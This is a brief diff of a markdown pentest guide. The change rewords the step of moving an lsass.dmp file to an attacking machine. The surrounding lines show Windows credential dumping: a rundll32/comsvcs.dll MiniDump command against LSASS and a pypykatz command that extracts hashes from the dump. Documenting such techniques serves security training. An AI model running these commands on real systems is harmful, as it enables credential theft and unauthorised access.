@@ -43,7 +43,7 @@ C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump
 
 ### Using Pypykatz
 
-Now we get that lsass.dmp file to our attacking machine and exctract the hashes using pypykatz.
+After downloading that lsass.dmp file to our attacking machine, now we can exctract the hashes using pypykatz.
 ```markdown
 pypykatz lsa minidump lsass.dmp
 ```
